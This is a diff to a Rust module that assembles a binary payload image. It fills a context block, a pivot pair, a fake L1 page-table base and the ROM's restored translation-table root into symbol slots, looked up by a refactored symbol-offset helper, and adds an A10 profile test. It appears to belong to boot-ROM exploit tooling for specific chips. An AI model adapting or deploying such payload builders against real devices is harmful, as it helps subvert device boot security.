@@ -18,6 +18,9 @@ pub const CTX_OFF: usize = 0xC000;
 
 /// Geometry of the measured regime: 36-bit VA, 16 KiB granule, two levels of
 /// 11 index bits. L1 index = VA[35:25], L2 index = VA[24:14], offset = VA[13:0].
+// The entry counts and the L2 index are part of the documented geometry and
+/// are used by the tables' construction and tests alike.
+#[allow(dead_code)]
 pub const L1_ENTRIES: usize = 2048;
 pub const L2_ENTRIES: usize = 2048;
 pub const PAGE: u64 = 0x4000;
@@ -47,6 +50,7 @@ pub fn l1_index(va: u64) -> usize {
 }
 
 /// The L2 index for a VA.
+#[allow(dead_code)] // used by the table construction and its tests
 pub fn l2_index(va: u64) -> usize {
     ((va >> 14) & 0x7FF) as usize
 }
@@ -67,6 +71,7 @@ pub fn table_desc(next_table_pa: u64) -> u64 {
 }
 
 /// A short description of a descriptor, for error messages.
+#[allow(dead_code)]
 pub fn describe(entry: u64) -> String {
     let kind = match entry & 3 {
         0 => "invalid",
@@ -131,26 +136,45 @@ pub fn build(profile: &crate::profile::Profile) -> Result<Vec<u8>, String> {
     put(&mut image, CTX_OFF + 0xE8, base + stage2_offset() as u64);
     put(&mut image, CTX_OFF + 0xF0, profile.need("ctx_entry"));
     put(&mut image, CTX_OFF + 0xF8, l1_base);
-    put(&mut image, CTX_OFF + 0x00, base + CTX_OFF as u64);
+    // CTX_OFF is not in the restore routine's field list, but it is where the
+    // callback's arg0 comes from, so the host sets the pair to (ctx, pivot).
+    put(&mut image, CTX_OFF, base + CTX_OFF as u64);
+
+    // The tables stage2 reads: the ROM's own stage-1 root to restore, and the
+    // vector table it installed. Both are per-build, and the source's defaults
+    // are a syntax-check convenience rather than a value any part uses.
+    put(
+        &mut image,
+        symbol_offset("rom_ttbr0"),
+        profile.need("ttbr0"),
+    );
+    if let Some(vbar) = profile.get("vbar") {
+        put(&mut image, symbol_offset("rom_vbar"), vbar);
+    }
 
     Ok(image)
 }
 
-/// The offset of `stage2` inside the payload code, from the symbol table the
-/// build script emits next to the assembled blob.
-fn stage2_offset() -> usize {
+/// A symbol's offset inside the payload code, from the table the build script
+/// emits next to the assembled blob. The layout is where the assembly puts
+/// it, so a symbol moved by an edit is a symbol this cannot find either.
+fn symbol_offset(name: &str) -> usize {
     let table = include_str!(concat!(env!("OUT_DIR"), "/payload.sym"));
     for line in table.lines() {
+        // The table is "name 0xvalue" per line, as build.rs writes it.
         let mut it = line.split_whitespace();
-        match (it.next(), it.next()) {
-            (Some("stage2"), Some(addr)) => {
+        if let (Some(found), Some(addr)) = (it.next(), it.next()) {
+            if found == name {
                 return usize::from_str_radix(addr.trim_start_matches("0x"), 16)
-                    .expect("stage2 symbol");
+                    .expect("a payload symbol");
             }
-            _ => {}
         }
     }
-    panic!("the payload object has no stage2 symbol");
+    panic!("the payload object has no {name} symbol");
+}
+
+fn stage2_offset() -> usize {
+    symbol_offset("stage2")
 }
 
 fn put(image: &mut [u8], off: usize, value: u64) {
@@ -201,6 +225,18 @@ mod tests {
         let x1 = CTX_OFF + 0xF8;
         let x1 = u64::from_le_bytes(image[x1..x1 + 8].try_into().unwrap());
         assert_eq!(x1, base + FAKE_L1_OFF as u64);
+    }
+
+    #[test]
+    fn the_payloads_own_tables_carry_the_parts_values() {
+        use crate::profile::A10;
+        let image = build(&A10).expect("build the A10 payload");
+        // The source's defaults are the A11's; the A10's own root must replace
+        // them, or stage2 would restore a table the ROM never installed.
+        let at = symbol_offset("rom_ttbr0");
+        let got = u64::from_le_bytes(image[at..at + 8].try_into().unwrap());
+        assert_eq!(got, A10.need("ttbr0"));
+        assert_ne!(got, 0x18000C000);
     }
 
     #[test]
